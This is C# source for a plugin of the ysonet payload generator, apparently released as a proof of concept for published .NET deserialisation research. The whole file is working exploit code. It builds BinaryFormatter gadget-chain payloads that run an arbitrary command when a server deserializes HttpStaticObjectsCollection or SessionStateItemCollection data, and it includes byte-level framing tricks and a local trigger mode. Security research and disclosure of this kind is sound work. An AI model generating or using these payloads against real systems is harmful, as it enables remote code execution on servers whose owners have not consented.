using NDesk.Options;
using System;
using System.Collections.Generic;
using System.IO;
using ysonet.Generators;
using ysonet.Helpers;

/**
 * Author: Soroush Dalili (@irsdl)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `HttpStaticObjectsCollection.Deserialize(BinaryReader) Method`: https://docs.microsoft.com/en-us/dotnet/api/system.web.httpstaticobjectscollection.deserialize and 
 *      `SessionStateItemCollection.Item[String] Property`: https://docs.microsoft.com/en-us/dotnet/api/system.web.sessionstate.sessionstateitemcollection.item 
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  This PoC uses BinaryFormatter from TypeConfuseDelegate
 *  The affected modules accept input type of BinaryReader
 **/

namespace ysonet.Plugins
{
    public class AltserializationPlugin : IPlugin
    {
        static string format = "";
        static string mode = "";
        static string command = "";
        static bool test = false;
        static bool minify = false;
        static bool useSimpleType = true;

        static OptionSet options = new OptionSet()
            {
                {"M|mode=", "the payload mode: HttpStaticObjectsCollection or SessionStateItemCollection. Default: HttpStaticObjectsCollection", v => mode = v },
                {"o|output=", "the output format (raw|base64).", v => format = v },
                {"c|command=", "the command to be executed", v => command = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
                {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
            };

        public string Name()
        {
            return "Altserialization";
        }

        public string Description()
        {
            return "Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection";
        }

        public string Credit()
        {
            return "Soroush Dalili";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            InputArgs inputArgs = new InputArgs();
            List<string> extra;
            try
            {
                extra = options.Parse(args);
                inputArgs.Cmd = command;
                inputArgs.Minify = minify;
                inputArgs.UseSimpleType = useSimpleType;
                inputArgs.Test = test;
            }
            catch (OptionException e)
            {
                Console.Write("ysonet: ");
                Console.WriteLine(e.Message);
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception(e.Message);
            }

            object payload = "";
            if (String.IsNullOrEmpty(command) || String.IsNullOrWhiteSpace(command))
            {
                Console.Write("ysonet: ");
                Console.WriteLine("Incorrect plugin mode/arguments combination");
                Console.WriteLine("Try 'ysonet -p " + Name() + " --help' for more information.");
                throw new Exception("Incorrect plugin mode/arguments combination");
            }

            if (mode.ToLower().Equals("sessionstateitemcollection"))
            {
                if (inputArgs.Minify)
                {
                    // Minified path. The default path below hands the gadget OBJECT to System.Web,
                    // whose SessionStateItemCollection.Serialize uses the stock BinaryFormatter and
                    // therefore ignores --minify. To honor it, take the minified BinaryFormatter blob
                    // directly and splice it into the SessionStateItemCollection wire format: store the
                    // blob as a byte[] value (its raw bytes go in verbatim), then flip the value's type
                    // marker to 20 so AltSerialization.ReadValueFromStream BF-deserializes those bytes
                    // on read, reaching the same gadget as the object path. The framing offsets are
                    // fixed by the empty key and the byte[] header (independent of the blob length), so
                    // the magic numbers hold for any blob. GenerateWithNoTest honors inputArgs.Minify.
                    byte[] bfBytes = (byte[])new TypeConfuseDelegateGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
                    byte[] tempPayload = new byte[bfBytes.Length + 1]; // one trailing byte fixes the length
                    bfBytes.CopyTo(tempPayload, 0);
                    System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
                    items[""] = tempPayload;
                    MemoryStream stream = new MemoryStream();
                    BinaryWriter writer = new BinaryWriter(stream);
                    items.Serialize(writer);
                    stream.Flush();
                    tempPayload = stream.ToArray();
                    byte[] newSerializedData = new byte[tempPayload.Length - 27 - 1 - 1];
                    Array.Copy(tempPayload, 0, newSerializedData, 0, 9); // first 9 bytes: collection header
                    Array.Copy(tempPayload, 36, newSerializedData, 9, tempPayload.Length - 27 - 1 - 9 - 1); // skip 27 bytes of byte[] framing, copy the blob, drop the trailing byte
                    newSerializedData[13] = 20; // value type 20 -> ReadValueFromStream BF-deserializes the blob
                    payload = newSerializedData;
                }
                else
                {
                    // Default path: hand the gadget OBJECT to System.Web and let it serialize with the
                    // stock BinaryFormatter. Clean, but cannot honor --minify (hence the branch above).
                    object serializedData = (object)TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
                    System.Web.SessionState.SessionStateItemCollection items = new System.Web.SessionState.SessionStateItemCollection();
                    items[""] = serializedData;
                    MemoryStream stream = new MemoryStream();
                    BinaryWriter writer = new BinaryWriter(stream);
                    items.Serialize(writer);
                    stream.Flush();
                    payload = stream.ToArray();
                }

                if (test)
                {
                    // PoC on how it works in practice
                    MemoryStream stream = new MemoryStream((byte[])payload);
                    BinaryReader binReader = new BinaryReader(stream);
                    System.Web.SessionState.SessionStateItemCollection test = System.Web.SessionState.SessionStateItemCollection.Deserialize(binReader);
                    test.GetEnumerator();
                }
            }
            else
            {
                // HttpStaticObjectsCollection
                byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
                byte[] newSerializedData = new byte[serializedData.Length + 7]; // ReadInt32 + ReadString + ReadBoolean + ReadByte
                serializedData.CopyTo(newSerializedData, 7);
                newSerializedData[0] = 1; // for ReadInt32
                newSerializedData[5] = 1; // for ReadBoolean
                newSerializedData[6] = 20; // for ReadByte - 20 is the type that will be deserialized in AltSerialization.ReadValueFromStream

                payload = newSerializedData;

                if (test)
                {
                    // PoC on how it works in practice
                    try
                    {
                        MemoryStream stream = new MemoryStream((byte[])payload);
                        BinaryReader binReader = new BinaryReader(stream);
                        System.Web.HttpStaticObjectsCollection test = System.Web.HttpStaticObjectsCollection.Deserialize(binReader);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
            }

            return payload;
        }
    }
}
